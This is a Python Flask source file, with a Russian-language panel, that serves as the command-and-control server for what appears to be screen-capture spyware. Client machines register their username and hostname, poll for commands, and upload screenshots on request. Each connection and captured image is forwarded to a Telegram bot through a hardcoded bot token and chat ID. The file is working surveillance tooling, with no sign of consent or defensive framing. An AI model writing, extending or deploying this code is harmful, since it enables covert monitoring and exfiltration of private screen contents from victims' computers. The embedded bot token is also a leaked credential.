import os
import requests
import base64
from flask import Flask, request, jsonify, render_template_string
from datetime import datetime, timedelta

BOT_TOKEN = "8330400918:AAEdz5G_0TxzZK8CyKz6oaIvJFRrPr8pbMw"
CHAT_ID = "8330400918"

app = Flask(__name__)
clients = {}
screenshots = {}

WEBAPP_HTML = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Панель управления</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#1a1a2e;color:#fff;min-height:100vh;padding:20px}
        h1{text-align:center;margin-bottom:20px}
        .btn{background:#3390ec;color:#fff;border:none;padding:12px 24px;font-size:16px;border-radius:8px;cursor:pointer;margin:5px}
        .btn:hover{opacity:0.9}
        .btn:disabled{opacity:0.5}
        .clients{margin:20px 0}
        .client{background:#2a2a4e;padding:15px;border-radius:10px;margin:10px 0}
        .client-info{margin-bottom:10px}
        .status{padding:10px;border-radius:8px;margin:10px 0;text-align:center}
        .online{color:#4caf50}
        .screenshot-container{margin-top:15px;text-align:center}
        .screenshot-container img{max-width:100%;border-radius:8px;margin-top:10px}
        .no-clients{text-align:center;color:#888;padding:40px}
    </style>
</head>
<body>
    <h1>📸 Панель управления</h1>
    <div style="text-align:center">
        <button class="btn" onclick="loadClients()">🔄 Обновить</button>
    </div>
    <div class="clients" id="clients">
        <div class="no-clients">Загрузка...</div>
    </div>

    <script>
        if(window.Telegram && window.Telegram.WebApp){
            Telegram.WebApp.ready();
            Telegram.WebApp.expand();
        }

        async function loadClients(){
            try{
                const res=await fetch('/clients');
                const data=await res.json();
                const container=document.getElementById('clients');
                
                if(Object.keys(data).length===0){
                    container.innerHTML='<div class="no-clients">Нет активных клиентов</div>';
                    return;
                }
                
                container.innerHTML='';
                for(const[id,info]of Object.entries(data)){
                    container.innerHTML+=`
                        <div class="client" id="client-${id}">
                            <div class="client-info">
                                <b>👤 ${info.username}@${info.hostname}</b><br>
                                <small>🕐 ${info.time}</small>
                                <span class="online"> ● Online</span>
                            </div>
                            <button class="btn" onclick="requestScreenshot('${id}')">📷 Сделать скриншот</button>
                            <div class="screenshot-container" id="screenshot-${id}"></div>
                        </div>
                    `;
                }
            }catch(e){
                console.error(e);
            }
        }

        async function requestScreenshot(clientId){
            const container=document.getElementById('screenshot-'+clientId);
            container.innerHTML='<p>⏳ Ожидание скриншота...</p>';
            
            await fetch('/request_screenshot',{
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({client_id:clientId})
            });
            
            // Проверяем каждую секунду
            let attempts=0;
            const check=setInterval(async()=>{
                attempts++;
                const res=await fetch('/get_screenshot/'+clientId);
                const data=await res.json();
                
                if(data.image){
                    container.innerHTML=`<img src="data:image/png;base64,${data.image}" alt="Screenshot">`;
                    clearInterval(check);
                }else if(attempts>30){
                    container.innerHTML='<p style="color:#f44336">❌ Таймаут</p>';
                    clearInterval(check);
                }
            },1000);
        }

        loadClients();
        setInterval(loadClients,15000);
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(WEBAPP_HTML)

@app.route('/register', methods=['POST'])
def register_client():
    data = request.json
    client_id = data.get('client_id')
    clients[client_id] = {
        'username': data.get('username'),
        'hostname': data.get('hostname'),
        'time': data.get('time'),
        'last_seen': datetime.now(),
        'screenshot_requested': False
    }
    send_telegram(f"🔔 Клиент подключен!\n\n👤 {data.get('username')}\n💻 {data.get('hostname')}\n🕐 {data.get('time')}")
    return jsonify({"success": True})

@app.route('/heartbeat/<client_id>')
def heartbeat(client_id):
    if client_id in clients:
        clients[client_id]['last_seen'] = datetime.now()
    return jsonify({"success": True})

@app.route('/clients')
def get_clients():
    # Удаляем неактивных (не было пинга 20 сек)
    now = datetime.now()
    inactive = [cid for cid, info in clients.items() if now - info.get('last_seen', now) > timedelta(seconds=20)]
    for cid in inactive:
        del clients[cid]
        send_telegram(f"🔴 Клиент отключился: {cid}")
    
    # Возвращаем без last_seen
    result = {}
    for cid, info in clients.items():
        result[cid] = {k: v for k, v in info.items() if k not in ['last_seen', 'screenshot_requested']}
    return jsonify(result)

@app.route('/request_screenshot', methods=['POST'])
def request_screenshot():
    data = request.json
    client_id = data.get('client_id')
    if client_id in clients:
        clients[client_id]['screenshot_requested'] = True
        screenshots.pop(client_id, None)
        return jsonify({"success": True})
    return jsonify({"success": False})

@app.route('/check_command/<client_id>')
def check_command(client_id):
    if client_id in clients:
        clients[client_id]['last_seen'] = datetime.now()
        if clients[client_id].get('screenshot_requested'):
            clients[client_id]['screenshot_requested'] = False
            return jsonify({"command": "screenshot"})
    return jsonify({"command": None})

@app.route('/upload_screenshot', methods=['POST'])
def upload_screenshot():
    if 'photo' not in request.files:
        return jsonify({"success": False})
    
    photo = request.files['photo']
    client_id = request.form.get('client_id', 'unknown')
    
    # Сохраняем в base64 для показа на сайте
    img_data = base64.b64encode(photo.read()).decode('utf-8')
    screenshots[client_id] = img_data
    
    # Отправляем в Telegram
    photo.seek(0)
    info = clients.get(client_id, {})
    caption = f"📸 Скриншот\n👤 {info.get('username', '?')}\n💻 {info.get('hostname', '?')}"
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    requests.post(url, files={'photo': ('screenshot.png', photo)}, data={'chat_id': CHAT_ID, 'caption': caption})
    
    return jsonify({"success": True})

@app.route('/get_screenshot/<client_id>')
def get_screenshot(client_id):
    img = screenshots.get(client_id)
    return jsonify({"image": img})

def send_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": text})
    except:
        pass

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
